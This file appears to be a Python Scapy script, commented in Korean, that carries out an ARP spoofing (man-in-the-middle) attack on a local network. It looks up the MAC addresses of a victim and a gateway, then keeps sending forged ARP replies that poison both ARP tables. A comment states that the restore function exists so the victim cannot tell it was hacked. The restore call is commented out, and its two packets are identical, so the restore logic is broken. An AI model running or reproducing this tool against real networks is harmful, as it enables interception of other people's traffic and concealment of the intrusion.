from scapy.all import *
from time import sleep
from scapy.layers.l2 import Ether, ARP

#이더넷 환경의 LAN에서 IP에 해당하는 컴퓨터의 MAC주소를 얻는다.
def getMAC(ip): 
    ans, unans = srp(Ether(dst='ff-ff-ff-ff-ff-ff')/ARP(pdst=ip), timeout=5, retry=3)
    for s, r in ans:
        return r.sprintf('Ether.src%')

#Scapy 모듈의 ARP()객체를 이용하여 ARP패킷을 구성하고 Scapy모듈의 send()로 ARP 패킷을 전송한다.
def poisonARP(srcip, targetip, targetmac):
    arp = ARP(op=2, psrc=srcip, pdst=targetip, hwdst=targetmac)
    send(arp)

#희생자 컴퓨터와 게이트웨이의 ARP테이블을 원상 복구하는 함수
#ARP 스푸핑을 통한 해킹 작업이 마무리되면 이 함수를 호출하여
# 피해 컴퓨터 및 게이트웨이의 ARP테이블을 원래대로 복구함으로써 자신이 해킹 피해를 입었는지 전혀 알 수 없게 한다.
def restoreARP(victimip, gatewayip, victimmac, gatewaymac):
    arp1 = ARP(op=2, pdst=victimip, psrc=gatewayip, hwdst='ff-ff-ff-ff-ff-ff', hwsrc=gatewaymac)
    arp2 = ARP(op=2, pdst=victimip, psrc=gatewayip, hwdst='ff-ff-ff-ff-ff-ff', hwsrc=gatewaymac)
    #hwdst의 값으로 'ff:ff:ff:ff:ff:ff'로 설정한 이유는 네트워크의 모든 호스트로 브로드캐스트하기 위해서
    send(arp1, count=3) #희생자 컴퓨터의 ARP 테이블에서 게이트웨이 MAC주소를 원래대로 복구하기 위한 ARP패킷
    send(arp2, count=3) #게이트웨이 ARP 테이블에서 피해 컴퓨터의 MAC 주소를 원래대로 복구하기 위한 ARP패킷

def main():
    gatewayip = ''
    victimip = ''

    victimmac = getMAC(victimip)
    gatewaymac = getMAC(gatewayip)

    if victimmac == None or gatewaymac == None:
        print('Mac주소를 찾을 수 없습니다')
        return
    #게이트웨이의 IP주소와 희생자 IP주소를 지정하고
    #getMAC()함수를 이용해 각각의 MAC주소를 얻는다.
    #만약 MAC주소를 얻지 못하면 프로그램을 종료하기 위해 리턴을 한다.

    print('ARP Spoofing 시작 -> VICTIM IP [%s]' %victimip)
    print('[%s]:POISON ARP Table [%s] -> [%s]' %(victimip, gatewaymac, victimmac))

    try:
        while True:
            poisonARP(gatewayip, victimip, victimmac)
            poisonARP(victimip, gatewayip, gatewaymac)
            sleep(3)
    except KeyboardInterrupt:
        #restoreARP(victimip, gatewayip, victimmac, gatewaymac)
        print('ARP Spoofing 종료 -> RESTORED ARP Table')

if __name__ == '__main__':
    main()

